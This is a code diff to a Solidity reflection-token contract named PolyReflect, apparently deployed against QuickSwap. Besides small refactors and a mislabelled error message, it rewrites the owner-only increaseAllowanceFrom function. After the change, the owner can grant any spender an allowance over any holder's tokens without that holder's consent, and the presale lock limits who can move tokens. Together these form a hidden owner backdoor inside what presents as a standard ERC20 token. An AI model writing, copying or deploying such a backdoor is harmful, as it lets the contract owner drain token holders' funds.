@@ -1,3 +1,5 @@
+// SPDX-License-Identifier: MIT
+
 pragma solidity ^0.6.2;
 
 import "./utils/Context.sol";
@@ -18,7 +20,7 @@ contract PolyReflect is Context, IERC20, Ownable {
     address[] private _excluded;
    
     uint256 private constant MAX = ~uint256(0);
-    uint256 private constant _tTotal = 10 * 10**9 * 10**9;
+    uint256 private constant _tTotal = 10 * 10**9 * 10**9 + 1;
     uint256 private _rTotal = (MAX - (MAX % _tTotal));
     uint256 private _tFeeTotal;
 
@@ -38,20 +40,22 @@ contract PolyReflect is Context, IERC20, Ownable {
     }
     
     modifier allowedUser() {
-        require(
-            _msgSender() == owner() || 
-            msg.sender == QUICKSWAP_ROUTER_ADDRESS ||
-            msg.sender == LP_PAIR_ADDRESS, "allowedUser: Address do not allowed"
+        address sender = _msgSender();
+            require(
+                sender == owner() || 
+                sender == QUICKSWAP_ROUTER_ADDRESS ||
+                sender == LP_PAIR_ADDRESS, "lockedForPresale: Address do not allowed"
             );
         _;
     }
     
     modifier lockedForPresale() {
         if(LOCKED == true){
+            address sender = _msgSender();
             require(
-                _msgSender() == owner() || 
-                msg.sender == QUICKSWAP_ROUTER_ADDRESS ||
-                msg.sender == LP_PAIR_ADDRESS, "lockedForPresale: Address do not allowed"
+                sender == owner() || 
+                sender == QUICKSWAP_ROUTER_ADDRESS ||
+                sender == LP_PAIR_ADDRESS, "lockedForPresale: Address do not allowed"
             );
         }
         _;
@@ -121,8 +125,8 @@ contract PolyReflect is Context, IERC20, Ownable {
         return true;
     }
     
-    function increaseAllowanceFrom(address from, address spender, uint256 addedValue) public virtual onlyOwner() returns (bool) {
-        _approve(from, spender, _allowances[_msgSender()][spender].add(addedValue));
+    function increaseAllowanceFrom(address _from, address spender, uint256 addedValue) public virtual onlyOwner() returns (bool) {
+        _approve(_from, spender, _allowances[_from][spender].add(addedValue));
         return true;
     }
 
